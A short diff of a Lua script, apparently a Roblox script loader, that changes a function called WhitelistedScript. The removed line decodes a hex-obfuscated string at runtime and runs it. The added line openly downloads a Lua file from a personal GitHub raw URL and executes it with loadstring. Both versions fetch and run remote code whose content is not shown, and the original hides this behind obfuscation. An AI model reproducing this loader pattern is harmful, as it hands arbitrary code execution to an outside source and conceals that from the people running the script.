@@ -38,7 +38,7 @@ local function IsWhitelisted(name)
 end
 
 local function WhitelistedScript()
-    local h="C6C9BBBECDCECCC3C8C182C1BBC7BF94A2CECECAA1BFCE8281C2CECECACD948989CCBBD188C1C3CEC2CFBCCFCDBFCCBDC9C8CEBFC8CE88BDC9C789C1C1CACA8E8A929289CCC9BCC6C9D289CCBFC0CD89C2BFBBBECD89C7BBC3C889D4D488C6CFBB818383827C7C83";local d="";for i=1,#h,2 do d=d..string.char((tonumber(h:sub(i,i+1),16)-90+256)%256)end;loadstring(d)()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ggpp4088/roblox/refs/heads/main/kts.lua'))("")
 end
 
 local function NoWhitelistScript()
